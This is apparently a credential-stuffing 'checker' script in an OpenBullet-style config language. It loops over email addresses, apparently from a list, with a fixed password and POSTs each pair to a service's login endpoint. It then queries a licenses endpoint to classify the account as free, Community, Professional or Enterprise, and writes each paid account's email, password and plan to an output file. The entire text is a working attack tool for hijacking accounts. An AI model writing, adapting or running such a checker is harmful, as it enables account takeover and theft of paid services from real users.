SET VAR "password" "63#45a3w9H{&6xe7pK96rG2Xa.~rK33."
PRINT "[19/217] $<email>... " White NoNewline

TRY
  HttpRequest GET $"<baseUrl>/u/login" AutoRedirect=True -> VAR "lr1"
  HttpRequest POST $"<baseUrl>/u/login" AutoRedirect=True
    CONTENT "username=$<email>&password=$<password>&action=default"
    CONTENTTYPE "application/x-www-form-urlencoded"
    -> VAR "lr2"
  HttpRequest GET $"<planBaseUrl>/users/$<email>/licenses" AutoRedirect=True -> VAR "lr3"
  
  SET VAR "plan" "free"
  IF $"<lr3>" Contains "Professional"
    SET VAR "plan" "Professional"
  ELSE
    IF $"<lr3>" Contains "Enterprise"
      SET VAR "plan" "Enterprise"
    ELSE
      IF $"<lr3>" Contains "Community"
        SET VAR "plan" "Community"
      ENDIF
    ENDIF
  ENDIF
  
  IF $"<plan>" != "free"
    FileAppend $"<outputFile>" "$<email>,$<password>,$<plan>"
    PRINT "✓ $<plan>" Green
    SET VAR "paidCount" $"<paidCount> + 1"
  ELSE
    PRINT "○ free" White
  ENDIF
CATCH
  PRINT "✗ error" Red
ENDTRY

